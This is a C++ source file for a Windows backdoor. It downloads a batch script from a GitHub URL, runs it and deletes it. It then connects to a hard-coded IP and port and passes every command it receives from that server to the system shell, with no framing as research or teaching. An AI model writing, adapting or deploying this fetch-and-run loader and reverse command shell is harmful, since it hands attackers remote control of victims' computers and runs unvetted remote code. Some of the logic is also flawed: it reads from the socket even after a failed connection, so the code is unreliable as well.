#include <iostream>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <string>
#include <fstream>
#include <cstdio>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "urlmon.lib")

using namespace std;

int main() {
    bool connected = false;
    string dwnld_URL = "https://raw.githubusercontent.com/simon0302010/temp/main/prepare.bat";
    string savepath = "prepare.bat";
    std::string preparebat = "prepare.bat";
    URLDownloadToFile(NULL, dwnld_URL.c_str(), savepath.c_str(), 0, NULL);
    Sleep(1500);
    system(const_cast<char*>(preparebat.c_str()));
    std::remove("prepare.bat");
    while (!connected) {
        WSADATA wsaData;
        SOCKET clientSocket;
        SOCKADDR_IN serverAddr;
        int serverPort = 1234;
        char receiveBuffer[1024];
        std::string cmdOutput;

        // Initialize Winsock
        if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
            std::cerr << "WSAStartup failed\n";
            return 1;
        }

        // Create socket
        if ((clientSocket = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET) {
            std::cerr << "Could not create socket\n";
            WSACleanup();
            return 1;
        }

        // Set server address and port
        serverAddr.sin_family = AF_INET;
        serverAddr.sin_port = htons(serverPort);
        serverAddr.sin_addr.s_addr = inet_addr("10.21.221.44");

        // Connect to server
        if (connect(clientSocket, (SOCKADDR *)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
            std::cerr << "Could not connect to server, retrying in 3 seconds...\n";
            closesocket(clientSocket);
            WSACleanup();
            Sleep(3000);
        } else {
            std::cout << "Connected to server!\n";
            connected = true;
        }

        // Receive data from server and execute in CMD
        while (true) {
            // Receive data
            int bytesReceived = recv(clientSocket, receiveBuffer, sizeof(receiveBuffer), 0);
            if (bytesReceived == SOCKET_ERROR) {
                std::cerr << "Error receiving data\n";
                break;
            }

            // Interpret received data as string
            std::string receivedStr(receiveBuffer, bytesReceived);

            //Execute the command from the server
            system(receivedStr.c_str());
        }

        // Close socket and cleanup Winsock
        closesocket(clientSocket);
        WSACleanup();
    }

    return 0;
}
